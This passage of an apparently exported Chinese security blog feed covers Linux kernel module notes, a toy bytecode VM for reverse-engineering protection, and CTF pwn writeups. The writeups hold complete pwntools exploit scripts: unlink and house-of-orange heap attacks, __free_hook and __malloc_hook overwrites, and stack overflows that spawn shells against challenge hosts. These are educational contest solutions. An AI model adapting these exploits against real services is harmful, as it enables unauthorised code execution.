https://www.ibm.com/developerworks/cn/linux/l-qemu/]]></content>
      <categories>
        <category>Linux_Kernel</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux内核模块编程学习笔记]]></title>
    <url>%2F2019%2F01%2F19%2F2019-1-19-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[最近想研究下linux内核，就开始学习内核模块编程，写篇博客，做下学习笔记。 内核模块编程模块的定义内核模块就是具有独立功能的程序，它能被单独编译，但是不能单独运行，它的运行必须被链接到内核作为内核的一部分在内核空间运行。 用户编程和内核模块编程的区别 基本组成模块通常由一组函数和数据结构组成，用来实现一种文件系统、一个驱动程序或其他内核上层的功能。 内核编程3个必须的头文件 #include &lt;linux/module.h&gt; #include &lt;linux/kernel.h&gt; #include &lt;linux/init.h&gt; 必须的两个函数 //模块加载函数 static int __init init_fun(void) //函数名随意，__init和__exit是init.h中定义的宏 { // 初始化代码 } //模块卸载函数 static void __exit exit_fun(void) { // 释放代码 } module_init(init_fun); //驱动程序初始化的入口点 module_exit(exit_fun); //对于可加载模块，内核在此处调用module_cleanup()函数，而对于内置的模块，它什么都不做。 一个简单的例子 // 基于 Linux 2.6的内核 #include &lt;linux/module.h&gt; #include &lt;linux/kernel.h&gt; #include &lt;linux/init.h&gt; static int __init init_fun( void ) { printk(“&lt;1&gt;Hello,World! from the kernel space…\n”); return 0; } static void __exit exit_fun( void ) { printk(“&lt;1&gt;Goodbye, World! leaving kernel space…\n”); } module_init(init_fun); module_exit(exit_fun); MODULE_LICENSE(“GPL”); //许可权限声明，如果不申明，模块加载时会收到内核的警告 模块编译工具：make(GNU的工程化编译工具) 工作原理： make 工具通过一个称为 Makefile 的文件来完成并自动维护编译工作。Makefile 需要按照某种语法进行编写，其中说明了如何编译各个源文件并连接生成可执行文件，并定义了源文件之间的依赖关系。 Makefile规则格式 : [tab] 冒号前面部分叫target，后面的部分叫前置条件，第二行必须由一个tab键起首，后面跟命令。 阮一峰 博客 这两篇文章可以做个入门 一个例子： # Makefile2.6 obj-m += hellomod.o # 产生hellomod 模块的目标文件 CURRENT_PATH := $(shell pwd) #模块所在的当前路径 LINUX_KERNEL := $(shell uname -r) #Linux内核源代码的当前版本 LINUX_KERNEL_PATH := /usr/src/linux-headers-$(LINUX_KERNEL) #Linux内核源代码的绝对路径 all: make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modules #编译模块了 clean: make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean #清理 常用的模块编程命令 lsmod 获得系统中加载了的所有模块以及模块间的依赖关系 cat /proc/modules 查看加载模块的信息 tree -a 在/sys/module 对应模块的文件夹下使用，可以显示一些联系 modinfo &lt;模块名&gt; 显示模块的信息 insmod &lt;模块名.ko&gt; 将模块插入内核 rmmod &lt;模块名.ko&gt; 将模块从内核中移除 后续如果有新东西的话会继续补充 reference linux 内核之旅]]></content>
      <categories>
        <category>CODE</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[逆向学习之虚拟机保护]]></title>
    <url>%2F2019%2F01%2F13%2F2019-11-13-%E9%80%86%E5%90%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BF%9D%E6%8A%A4%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[考试周终于过去了，是时候又要开始学习了。所以就研究下逆向中的虚拟机保护技术，下面记录下学习的过程，以及一些收获。 基础概念逆向中的虚拟机保护是一种基于虚拟机的代码保护技术。它将基于x86汇编系统中的可执行代码转换为字节码指令系统的代码，来达到不被轻易逆向和篡改的目的。简单点说就是将程序的代码转换自定义的操作码(opcode)，然后在程序执行时再通过解释这些操作码，选择对应的函数执行，从而实现程序原有的功能。 vm_start：虚拟机的入口函数，对虚拟机环境进行初始化 vm_dispatcher:调度器，解释opcode，并选择对应的handle函数执行，当handle执行完后会跳回这里，形成一个循环。 opcode :程序可执行代码转换成的操作码 ####虚拟机执行的基本流程 实现一个小型的虚拟机这里我通过实现一个简化版的小型虚拟机来加深对虚拟机的认识，语言用的是C语言。 要想实现虚拟机的话需要完成两个目标： 定义一套opcode 实现opcode的解释器 opcode只是一个标识，可以随便定义，这里我定义了4条指令，每条指令分别对应着一个字节的字节码。而opcode的解释器是用来对opcode进行解释，从而选择对应的handle函数执行。 定义opcodeenum opcodes { MOV = 0xf1, XOR = 0xf2, RET = 0xf4, READ = 0xf5, }; 因为我只是为了理解，所以就只定义了几个常用指令。这里我用了枚举类型来定义opcode，比较方便。 实现解释器opcode定义完后，就可以开始实现解释opcode的解释器了。解释器我们需要实现一个虚拟环境以及各个opcode对应的handle函数。虚拟环境则是真实物理机的一个虚拟，是自己定义的字节码运行的环境。 一些关键的结构体vm_cputypedef struct vm_cpus { int r1; 虚拟寄存器r1 int r2; 虚拟寄存器r2 int r3; 虚拟寄存器r3 unsigned char *eip; 指向正在解释的opcode的地址 vm_opcode op_list[OPCODE_N]; opcode列表，存放了所有的opcode及其对应的处理函数 }vm_cpu; vm_opcodetypedef struct { unsigned char opcode; void (*handle)(void *); }vm_opcode; 其中 r1-r3是我定义的通用寄存器，用来传参或者是存放返回值，eip指向正在解释的opcode的地址，op_list则存放了所有opcode及其对应的handle函数。 实现了虚拟环境后就可以开始实现解释器了。解释器的功能就是对opcode解析，选择相应的handle函数，并且将相应的参数传递给handle函数。由handle函数来解释执行一条指令 关键函数vm_initvoid vm_init(vm_cpu *cpu) //初始化虚拟机环境 { cpu-&gt;r1 = 0; cpu-&gt;r2 = 0; cpu-&gt;r3 = 0; cpu-&gt;eip = (unsigned char *)vm_code; //将eip指向opcode的地址 cpu-&gt;op_list[0].opcode = 0xf1; cpu-&gt;op_list[0].handle = (void (*)(void *))mov; //将操作字节码与对应的handle函数关联在一起 cpu-&gt;op_list[1].opcode = 0xf2; cpu-&gt;op_list[1].handle = (void (*)(void *))xor; cpu-&gt;op_list[2].opcode = 0xf5; cpu-&gt;op_list[2].handle = (void (*)(void *))read_; vm_stack = malloc(0x512); memset(vm_stack,0,0x512); } vm_startvoid vm_start(vm_cpu *cpu) { /* 进入虚拟机 eip指向要被解释的opcode地址 */ cpu-&gt;eip = (unsigned char*)opcodes; while((*cpu-&gt;eip)!= RET)//如果opcode不为RET，就调用vm_dispatcher来解释执行 { vm_dispatcher(*cpu-&gt;eip); } } vm_dispatchervoid vm_dispatcher(vm_cpu *cpu) { int i; for(i=0 ; i &lt; OPCODE_N ; i++) { if(*cpu-&gt;eip == cpu-&gt;op_list[i].opcode) { cpu-&gt;op_list[i].handle(cpu); break; } } } handlesvoid mov(vm_cpu *cpu); void xor(vm_cpu *cpu); //xor flag void read_(vm_cpu *cpu); //call read ,read the flag void xor(vm_cpu *cpu) { int temp; temp = cpu-&gt;r1 ^ cpu-&gt;r2; temp ^= 0x12; cpu-&gt;r1 = temp; cpu-&gt;eip +=1; //xor指令占一个字节 } void read_(vm_cpu *cpu) { char *dest = vm_stack; read(0,dest,12); //用于往虚拟机的栈上读入数据 cpu-&gt;eip += 1; //read_指令占一个字节 } void mov(vm_cpu *cpu) { //mov指令的参数都隐藏在字节码中，指令表示后的一个字节是寄存器标识，第二到第五是要mov的数据在vm_stack上的偏移 //我这里只是实现了从vm_stack上取数据和存数据到vm_stack上 unsigned char *res = cpu-&gt;eip + 1; //寄存器标识 int *offset = (int *) (cpu-&gt;eip + 2); //数据在vm_stack上的偏移 char *dest = 0; dest = vm_stack; switch (*res) { case 0xe1: cpu-&gt;r1 = *(dest + *offset); break; case 0xe2: cpu-&gt;r2 = *(dest + *offset); break; case 0xe3: cpu-&gt;r3 = *(dest + *offset); break; case 0xe4: { int x = cpu-&gt;r1; *(dest + *offset) = x; break; } } cpu-&gt;eip += 6; //mov指令占六个字节，所以eip要向后移6位 } 要执行的伪代码解释器到这就实现完了。接下来是要将想要实现功能的伪代码转成自定义的opcode，伪代码的功能是从标准输入中读取12个字节的字符串，然后将读入的字符串每个字符与0x0还有0x12进行异或，并且将结果存储在虚拟机的栈上。写出来大致就是下面这样子 /* call read_ MOV R1,flag[0] XOR MOV R1,0x20; //这是将R1的值送到vm_stack+0x20的位置，后面的同上 MOV R1,flag[1] XOR MOV R1,0x21; MOV R1,flag[2] XOR MOV R1,0x22 MOV R1,flag[3] XOR MOV R1,0x23; MOV R1,flag[4] XOR MOV R1,0x24; MOV R1,flag[5] XOR MOV R1,0x25; MOV R1,flag[6] XOR MOV R1,0x26; MOV R1,flag[7] XOR MOV R1,0x26 MOV R1,flag[7] XOR MOV R1,0X27 MOV R1,flag[7] XOR MOV R1,0x28 MOV R1,flag[7] XOR MOV R1,0X29 MOV R1,flag[7] XOR MOV R1,0x2A MOV R1,flag[7] XOR MOV R1,0x2b */ 将它转换成对应的字节码，然后用解释器去解释执行就可以实现伪代码的功能。 unsigned char vm_code[] = { 0xf5, 0xf1,0xe1,0x0,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x20,0x00,0x00,0x00, 0xf1,0xe1,0x1,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x21,0x00,0x00,0x00, 0xf1,0xe1,0x2,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x22,0x00,0x00,0x00, 0xf1,0xe1,0x3,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x23,0x00,0x00,0x00, 0xf1,0xe1,0x4,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x24,0x00,0x00,0x00, 0xf1,0xe1,0x5,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x25,0x00,0x00,0x00, 0xf1,0xe1,0x6,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x26,0x00,0x00,0x00, 0xf1,0xe1,0x7,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x27,0x00,0x00,0x00, 0xf1,0xe1,0x8,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x28,0x00,0x00,0x00, 0xf1,0xe1,0x9,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x29,0x00,0x00,0x00, 0xf1,0xe1,0xa,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x2a,0x00,0x00,0x00, 0xf1,0xe1,0xb,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x2b,0x00,0x00,0x00, 0xf1,0xe1,0xc,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x2c,0x00,0x00,0x00, 0xf4 }; 至此，简化版的小型虚拟机就实现完了。我在虚拟机中实现了对输入字符串简单的异或加密，并将加密后的值存储到指定位置。我觉得这个过程是十分有意义的，让我加深了对虚拟机保护的了解。因为能力有限，所以就只实现了一个很简单的小型虚拟机。虚拟机相关的题目还没有做，等有时间再去做一下。]]></content>
      <categories>
        <category>REVERSE</category>
      </categories>
      <tags>
        <tag>Vmare protect</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-高校网络信息安全管理运维挑战赛-pwn-writeup]]></title>
    <url>%2F2018%2F11%2F20%2F2018-11-20-2018-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9B-pwn-writeup%2F</url>
    <content type="text"><![CDATA[挂机pwn手，赛后复现…….各位大佬是真的强 hack防护机制： ☁ HACK checksec hack [*] &#39;/home/zs0zrc/game/gaoxiaoyunwei/HACK/hack&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 程序逻辑 int __cdecl main(int argc, const char **argv, const char **envp) { char *v3; // eax char *buf; // ST18_4 _DWORD *v5; // eax _DWORD *v6; // eax _DWORD *v7; // ST24_4 int v8; // ST28_4 int v9; // ST2C_4 prepare(); printf(&quot;The address of printf is: %p\n&quot;, puts); puts(&quot;Suppose there is a struct like: &quot;); puts(&quot;struct node {\n\tchar *name;\n\tchar *description;\n\tstruct node *next;\n\tstruct node *prev;\n};&quot;); puts(&quot;And you have a chance to fabricate a fake node struct;\nWhat can you do?&quot;); puts(&quot;Besides you can have two chances to leak, input address: &quot;); v3 = malloc(0x14u); buf = v3; v3[read(0, v3, 0xFu) - 1] = 0; v5 = atoll(buf); printf(&quot;%d, %p\n&quot;, v5, *v5); puts(&quot;Second chance: &quot;); buf[read(0, buf, 0xFu) - 1] = 0; v6 = atoll(buf); printf(&quot;%d, %p\n&quot;, v6, *v6); v7 = malloc(0x14u); printf(&quot;The address of the node is %p, and you can input the fake node now: &quot;, v7); read(0, v7, 0x10u); v8 = v7[3]; v9 = v7[2]; *(v8 + 8) = v9; *(v9 + 0xC) = v8; return 0; } 程序先给了两次任意地址泄露的机会，然后再最后实现了一个类似于unlink的操作，导致可以任意地址写。 利用思路： main函数返回时 ，返回地址存放在栈上，通过任意地址写将 main函数的返回地址改写成one_gadget main函数返回时进行的操作以及栈的情况 main函数返回时的stack pwndbg&gt; stack 20 00:0000│ esp 0xffb4aed0 ◂— 0x1 01:0004│ 0xffb4aed4 ◂— 0x0 02:0008│ 0xffb4aed8 —▸ 0x9de7008 ◂— &#39;4151692732&#39; 03:000c│ 0xffb4aedc ◂— 0xb /* &#39;\x0b&#39; */ 04:0010│ 0xffb4aee0 —▸ 0xf775cdbc (environ) —▸ 0xffb4afac —▸ 0xffb4c2b5 ◂— 0x515f5451 (&#39;QT_Q&#39;) 05:0014│ 0xffb4aee4 —▸ 0x9de7020 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl 0xf75e383f 06:0018│ 0xffb4aee8 —▸ 0xffb4aeec —▸ 0x9de7024 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl 0xf75e383f 07:001c│ edx 0xffb4aeec —▸ 0x9de7024 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl 0xf75e383f 08:0020│ 0xffb4aef0 —▸ 0xf775b3dc (__exit_funcs) —▸ 0xf775c1e0 (initial) ◂— 0x0 09:0024│ 0xffb4aef4 —▸ 0x9de7024 —▸ 0xf75e3819 (__strtold_nan+137) ◂— jl 0xf75e383f 0a:0028│ ebp 0xffb4aef8 ◂— 0x0 0b:002c│ 0xffb4aefc —▸ 0xf75c1637 (__libc_start_main+247) ◂— add esp, 0x10 0c:0030│ 0xffb4af00 —▸ 0xf775b000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 ... ↓ 0e:0038│ 0xffb4af08 ◂— 0x0 0f:003c│ 0xffb4af0c —▸ 0xf75c1637 (__libc_start_main+247) ◂— add esp, 0x10 10:0040│ 0xffb4af10 ◂— 0x1 11:0044│ 0xffb4af14 —▸ 0xffb4afa4 —▸ 0xffb4c2ae ◂— &#39;./hack&#39; 12:0048│ 0xffb4af18 —▸ 0xffb4afac —▸ 0xffb4c2b5 ◂— 0x515f5451 (&#39;QT_Q&#39;) 13:004c│ 0xffb4af1c ◂— 0x0 泄露出来的stack的地址和ebp的偏移 pwndbg&gt; p 0xffb4afac - 0xffb4aef4 $1 = 0xb8 只要将ebp-4出修改为one_gadget，那么就可以控制程序执行流 exp: from pwn import* context.log_level = &quot;debug&quot; p = remote(&#39;210.32.4.16&#39;,&#39;13375&#39;) elf = ELF(&#39;./hack&#39;) libc = ELF(&#39;./libc.so&#39;) log.info(&quot;leak libc address &quot;) puts_got = elf.got[&quot;puts&quot;] p.recvuntil(&quot;input address: \n&quot;) p.sendline(str(puts_got)) p.recvuntil(&quot;, &quot;) puts = int(p.recv(10),16) libc_base = puts - libc.symbols[&quot;puts&quot;] env = libc_base + libc.sym[&quot;_environ&quot;] one = libc_base + 0x3a819 libc.address = libc_base log.info(&quot;libc_base --&gt; {}&quot;.format(hex(libc_base))) p.sendline(str(env)) p.recvuntil(&quot;, &quot;) stack_addr = int(p.recv(10),16) target = stack_addr - 0xb8 log.info(&quot; stack address is {}&quot;.format(hex(stack_addr))) p.recvuntil(&quot; is &quot;) node_add = int(p.recvuntil(&quot;,&quot;).strip(&quot;,&quot;),16) log.info(&quot;node address is {}&quot;.format(hex(node_add))) p.recv() payload = p32(one)*2 + p32(node_add + 4)+p32(target-8) p.send(payload) p.interactive() justnote防护机制： ☁ just_note checksec justnote [*] &#39;/home/zs0zrc/game/gaoxiaoyunwei/just_note/justnote&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 程序逻辑： int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v4; // [rsp+18h] [rbp-8h] prepare(); do { while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { v4 = menu(); if ( v4 &gt; 0 &amp;&amp; v4 &lt;= 4 ) break; puts(&quot;invalid choice!&quot;); } if ( v4 != 2 ) break; remove_note(); } if ( v4 &gt; 2 ) break; if ( v4 == 1 ) insert_note(); } if ( v4 != 3 ) break; edit_note(); } } while ( v4 != 4 ); return 0; } 一共有三个功能： insert_note 创建一个新的note edit_note 编辑note remove_note 删除一个note insert_note： int insert_note() { __int64 chunk; // [rsp+8h] [rbp-18h] __int64 size; // [rsp+10h] [rbp-10h] signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; i &lt;= 31 &amp;&amp; *(16LL * i + table); ++i ) ; if ( i == 32 ) return puts(&quot;no more, no more&quot;); chunk = calloc(0x100uLL, 1uLL); if ( !chunk ) { puts(&quot;memory error, contact admin&quot;); exit(1); } printf(&quot;length of note: &quot;, 1LL); size = read_long_long(); if ( size &lt; 0 ) //漏洞点： 最小的负数取反还是负数，可以造成堆溢出，无限写入 size = -size; if ( size &gt; 0xFF ) size = 255LL; printf(&quot;note: &quot;); recvn(chunk, size); *(16LL * i + table) = chunk ^ 0xDEADBEEFCAFEBABELL; *(table + 16LL * i + 8) = size; return printf(&quot;check it out: %s\n&quot;, chunk); } edit_note: int edit_note() { __int64 v1; // [rsp+8h] [rbp-8h] printf(&quot;index of note: &quot;); v1 = read_long_long(); if ( v1 &lt; 0 || v1 &gt; 31 ) return puts(&quot;out of range&quot;); if ( !*(16 * v1 + table) ) return puts(&quot;no note here&quot;); printf(&quot;note: &quot;); return recvn(*(16 * v1 + table) ^ 0xDEADBEEFCAFEBABELL, *(16 * v1 + table + 8)); } delete_note: int remove_note() { signed __int64 v0; // rax __int64 v2; // [rsp+8h] [rbp-8h] printf(&quot;index of note: &quot;); v2 = read_long_long(); if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 31 ) { if ( *(16 * v2 + table) ) { free((*(16 * v2 + table) ^ 0xDEADBEEFCAFEBABELL)); *(16 * v2 + table) = 0LL; v0 = 16 * v2 + table; *(v0 + 8) = 0LL; } else { LODWORD(v0) = puts(&quot;no note here&quot;); } } else { LODWORD(v0) = puts(&quot;out of range&quot;); } return v0; } 解题思路： 利用堆溢出，先泄露出堆地址，然后泄露libc地址 后面的做法就是house_of_orange了 伪造_IO_FILE结构体，利用unsorted bin attack,修改 _IO_list_all为 main_arena + 0x58 最后调用malloc函数，触发 _malloc_printerr ，最终getshell 要注意的是 ，因为它分配堆的空间用的函数是calloc函数，它默认是会初始化堆块，将空间内容清空，但是如果是mmap分配的chunk空间的话，就不会清空。所以想泄露信息的话就要将chunk的 IS_MMAPED标志位覆盖为1 伪造的fake_file fake_file = &#39;/bin/sh&#39;.ljust(8, &#39;\x00&#39;) + p64(0x61) fake_file +=p64(0) + p64(io_list_all_addr - 0x10) #unsorted bin attack fake_file += p64(0) #_IO_write_base fake_file += p64(1) #_IO_write_ptr bypass check fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) fake_file += p64(0) * 9 fake_file += p64(system_addr) fake_file =fake_file.ljust(0xc0,&#39;\x00&#39;) fak_file += p64(0xffffffffffffffff) #bypass fp-&gt;_mode &lt;= 0 fake_file += p64(0) * 2 fake_file += p64(fake_file_addr + 0x60) #vtable 伪造的vtable表 最终exp： #!/usr/bin/env python from pwn import * local = 1 if local: p = process(&#39;./justnote&#39;) elf = ELF(&#39;./justnote&#39;) libc = elf.libc else: p = remote(&quot;210.32.4.17&quot;,&quot;13376&quot;) elf = ELF(&#39;./justnote&#39;) libc = ELF(&#39;./libc.so&#39;) context.arch = elf.arch context.log_level=&#39;debug&#39; def add(lgth, note): p.recvuntil(&#39;choice: &#39;) p.sendline(&#39;1&#39;) p.recvuntil(&#39;note: &#39;) p.sendline(str(lgth)) p.recvuntil(&#39;note: &#39;) p.sendline(note) def delete(idx): p.recvuntil(&#39;choice: &#39;) p.sendline(&#39;2&#39;) p.recvuntil(&#39;note: &#39;) p.sendline(str(idx)) def edit(idx, note): p.recvuntil(&#39;choice: &#39;) p.sendline(&#39;3&#39;) p.recvuntil(&#39;note: &#39;) p.sendline(str(idx)) p.recvuntil(&#39;note: &#39;) p.sendline(note) def HouseOfOrange(fake_file_addr, system_addr, io_list_all_addr): fake_file = &#39;/bin/sh&#39;.ljust(8, &#39;\x00&#39;) + p64(0x61) fake_file +=p64(0) + p64(io_list_all_addr - 0x10) #unsorted bin attack fake_file += p64(0) #_IO_write_base fake_file += p64(1) #_IO_write_ptr bypass check fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) fake_file += p64(0) * 9 fake_file += p64(system_addr) fake_file =fake_file.ljust(0xc0,&#39;\x00&#39;) fake_file += p64(0xffffffffffffffff) #bypass fp-&gt;_mode &lt;= 0 fake_file += p64(0) * 2 fake_file += p64(fake_file_addr + 0x60) #vtable return fake_file add(-9223372036854775808,&#39;a&#39;*8) #0 add(100,&#39;b&#39;*8) #1 add(-9223372036854775808,&#39;c&#39;*8) #2 add(100,&#39;d&#39;*8) #3 add(-9223372036854775808,&#39;e&#39;*8) #4 add(100,&#39;d&#39;*8) #5 add(100,&#39;d&#39;*8) #6 delete(1) delete(3) pause() edit(0,&#39;\x00&#39;*0x108 + &#39;\x13&#39;) add(100,&#39;a&#39;*8) p.recvuntil(&quot;a&quot;*8) heap_addr = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) heap_base = heap_addr - 0x540 log.info(&quot;heap address is {}&quot;.format(hex(heap_addr))) edit(2,&#39;\x00&#39;*0x108 + &#39;\x13&#39;) add(100,&#39;a&#39;*8) p.recvuntil(&quot;a&quot;*8) libc_base = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) - libc.symbols[&#39;__malloc_hook&#39;] - 0x10 - 0x58 log.info(&quot;libc address is {}&quot;.format(hex(libc_base))) libc.address = libc_base delete(5) edit(4, &#39;\x00&#39; * 0x100 + HouseOfOrange(heap_addr + 0x110 * 2, libc.sym[&#39;system&#39;], libc.sym[&#39;_IO_list_all&#39;])) p.recvuntil(&#39;choice: &#39;) p.sendline(&#39;1&#39;) p.interactive() reference: 高校运维赛 2018 Writeup – 天枢]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SUCTF 招新赛 2018 writeup]]></title>
    <url>%2F2018%2F11%2F19%2F2018-11-19-SUCTF-%E6%8B%9B%E6%96%B0%E8%B5%9B-2018-writeup%2F</url>
    <content type="text"><![CDATA[前段时间做了下SUCTF的招新赛的pwn题，题目还是很友好的，适合新手。但是一直没有写writeup，现在有时间就把writeup写了。 basic-pwn简单的栈溢出 直接上exp: from pwn import* p = process(&#39;pwn&#39;) payload = &#39;a&#39;*280 + p64(0x4005c7) p.sendline(payload) p.interactive() stack也是简单栈溢出，和basic-pwn差不多 exp: from pwn import* p=process(&quot;./pwn&quot;) payload=&#39;a&#39;*0x28+p64(0x400676) p.recvuntil(&quot;============================\n&quot;) p.sendline(payload) p.interactive() babyarray数组下标溢出，将特定变量覆盖为0就可以了。 输入 的下标为-14，值为0 。 unlink一道简单的unlink题。改写__free_hook为system函数，再free掉一个包含“/bin/sh”字符串的chunk，就可以getshell exp: #!/usr/bin/env python from pwn import * local = 0 if local: p = process(&#39;./unlink&#39;) elf = ELF(&#39;./unlink&#39;) libc = elf.libc else: p = remote(&quot;43.254.3.203&quot;,10005) elf = ELF(&#39;./unlink&#39;) libc = ELF(&#39;./libc-2.23.so&#39;) context.arch = elf.arch context.log_level=&#39;debug&#39; def touch(size): p.sendlineafter(&quot;please chooice :\n&quot;,&quot;1&quot;) p.sendlineafter(&quot;size : \n&quot;,str(size)) def delete(idx): p.sendlineafter(&quot;please chooice :\n&quot;,&quot;2&quot;) p.sendlineafter(&quot; delete\n&quot;,str(idx)) def show(idx): p.sendlineafter(&quot;please chooice :\n&quot;,&quot;3&quot;) p.sendlineafter(&quot;show\n&quot;,str(idx)) def take(idx,content): p.sendlineafter(&quot;please chooice :\n&quot;,&quot;4&quot;) p.sendlineafter(&quot;modify :\n&quot;,str(idx)) p.sendlineafter(&quot;content\n&quot;,content) ptr = 0x06020C0 fake_chunk = p64(0) + p64(0x90) + p64(ptr - 0x18) + p64(ptr - 0x10) fake_chunk = fake_chunk.ljust(0x90,&#39;a&#39;) fake_chunk += p64(0x90) + p64(0x90) touch(0x90) touch(0x80) touch(0x20) delete(0) touch(0x90) show(0) p.recvuntil(&quot;the content is : \n&quot;) leak = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) log.info(hex(leak)) libc_base = leak - libc.symbols[&#39;__malloc_hook&#39;] - 0x10 - 0x58 libc.address = libc_base log.info(hex(libc_base)) take(0,fake_chunk) delete(1) payload = &#39;a&#39;*0x18 + p64(libc.symbols[&#39;__free_hook&#39;]) take(2,&quot;/bin/sh&quot;) take(0,payload) take(0,p64(libc.symbols[&#39;system&#39;])*2) delete(2) p.interactive() ez_heap网鼎杯半决赛的原题，就改了下字符串。漏洞点是一个UAF。 利用方法，先利用unsorted bin将libc地址泄露出来，然后利用UAF漏洞来进行fastbins_dup 分配到包含__malloc_hook的chunk，改写 _malloc_hook为one_gadget，最后通过doublefreee触发 _malloc_printerr 来getshell。 详情可以看我之前网鼎杯的writeup地址 exp #!/usr/bin/env python from pwn import * local = 0 if local: p = process(&#39;./ez_heap&#39;) elf = ELF(&#39;./ez_heap&#39;) libc = elf.libc else: host = &#39;43.254.3.203&#39; port = &#39;10006&#39; p = remote(host,port) elf = ELF(&#39;./ez_heap&#39;) libc = ELF(&#39;./libc-2.23.so&#39;) context.arch = elf.arch #context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) def create(size,name,t): ru(&#39;Your choice : &#39;) sl(&#39;1&#39;) ru(&#39;Length of the name :&#39;) sl(str(size)) ru(&#39;The name of animal :&#39;) sd(name) ru(&#39;The kind of the animal :&#39;) sl(t) def view(): ru(&#39;Your choice : &#39;) sl(&#39;2&#39;) def delete(idx): ru(&#39;Your choice : &#39;) sl(&#39;3&#39;) rc() sl(str(idx)) def clean(): ru(&#39;Your choice : &#39;) sl(&#39;4&#39;) create(0x98,&#39;a&#39;*8,&#39;1234&#39;) create(0x68,&#39;bbbb&#39;,&#39;456798&#39;) create(0x68,&#39;bbbb&#39;,&#39;456798&#39;) create(0x28,&#39;bbbb&#39;,&#39;456798&#39;) delete(0) clean() create(0x98,&#39;a&#39;*8,&#39;1234&#39;) view() ru(&#39;a&#39;*8) leak = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) main_arena = leak - 0x58 log.info(hex(main_arena)) pause() libc_base = main_arena - libc.symbols[&#39;__malloc_hook&#39;] - 0x10 log.info(&quot;libc_base is {}&quot;.format(hex(libc_base))) malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;] system = libc_base + libc.symbols[&#39;system&#39;] one_gadget = 0xf02a4 + libc_base delete(1) delete(2) delete(1) create(0x68,p64(malloc_hook - 0x23),&#39;1234&#39;) create(0x68,&#39;bbbb&#39;,&#39;456798&#39;) create(0x68,&#39;bbbb&#39;,&#39;456798&#39;) create(0x68,&#39;a&#39;*0x13 + p64(one_gadget),&#39;1234&#39;) delete(0) delete(0) p.interactive() easy_overflow_file_structureIO_FILE利用的简化版 漏洞点: 解析请求头字段的循环退出不当，导致可以写入多次，导致溢出，可以覆盖掉文件流指针 __int64 __fastcall lookForHeader(const char *strings, __int64 input, signed int size, _BYTE *target, unsigned int count) { _BYTE *v5; // rax _BYTE *v6; // rdx __int64 result; // rax _BYTE *v8; // [rsp+0h] [rbp-40h] unsigned int v9; // [rsp+8h] [rbp-38h] signed int v10; // [rsp+Ch] [rbp-34h] unsigned int n; // [rsp+2Ch] [rbp-14h] size_t n_4; // [rsp+30h] [rbp-10h] unsigned int j; // [rsp+38h] [rbp-8h] signed int i; // [rsp+3Ch] [rbp-4h] v10 = size; v8 = target; v9 = count; n = strlen(strings); for ( i = 0; ; ++i ) { result = v10 - n; if ( (signed int)result &lt;= i ) break; if ( !strncmp((const char *)(input + i), strings, n) &amp;&amp; *(_BYTE *)(i + n + input) == 58 ) { for ( i += n + 1; i &lt; v10 &amp;&amp; (*(_BYTE *)(i + input) == 32 || *(_BYTE *)(i + input) == 9); ++i ) ; for ( j = i; j &lt; v10; ++j ) { if ( *(_BYTE *)(j + input) == 35 ) { if ( j - i + 1 &lt;= v9 ) { n_4 = i + input; while ( n_4 &lt; (unsigned __int64)j + input ) { v5 = v8++; v6 = (_BYTE *)n_4++; *v5 = *v6; } *v8 = 0; } break; } } } } return result; } exp: from pwn import* context.log_level = &quot;debug&quot; #p = process(&#39;./eofs&#39;) p = remote(&#39;43.254.3.203&#39;,&quot;10002&quot;) payload = &quot;GET / HTTP/1.1#&quot; 